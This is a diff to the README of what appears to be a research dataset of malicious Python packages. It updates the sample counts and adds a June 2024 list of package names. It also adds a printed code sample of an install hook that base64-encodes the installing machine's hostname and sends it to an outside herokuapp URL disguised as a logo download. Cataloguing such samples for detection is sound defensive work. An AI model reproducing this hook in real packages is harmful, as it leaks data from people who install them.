@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 5,923 versions of the source code of 5,194 malicious packages.
+This data set includes about 5,939 versions of the source code of 5,199 malicious packages.
 
 ## Dataset Format
 
@@ -492,6 +492,30 @@ Filesyncer()
 
 ### 12 Jun. 2024 
 pyzelf [2.0.1] <br>
+
+
+### 14 Jun. 2024 
+pytypier [1.0.2] <br>
+pyspliter [1.0.2] <br>
+builderknower [0.1.1, 0.1.2, 0.1.3, 0.1.4, 0.1.5, 0.1.6, 0.1.7, 0.1.8, 0.1.9, 0.1.10, 0.1.11, 0.1.12] <br>
+thesis-uniud-package [1.0.0] <br>
+thesis-package [1.0.0] <br>
+
+```python
+def _post_install():
+    hostname = base64.b64encode(socket.getfqdn().encode()).decode()
+    url = f'https://stark-mesa-88610-1b7520139d14.herokuapp.com/logo.png?{hostname}'
+    destination = os.path.join(os.path.dirname(__file__), 'logo.png')
+    with urllib.request.urlopen(url) as response, open(destination, 'wb') as out_file:
+        data = response.read()
+        out_file.write(data)
+
+
+class CustomInstallCommand(install):
+    def __init__(self, *args, **kwargs):
+        super(CustomInstallCommand, self).__init__(*args, **kwargs)
+        atexit.register(_post_install)
+```
 
 
 ## About the malicious packages detection
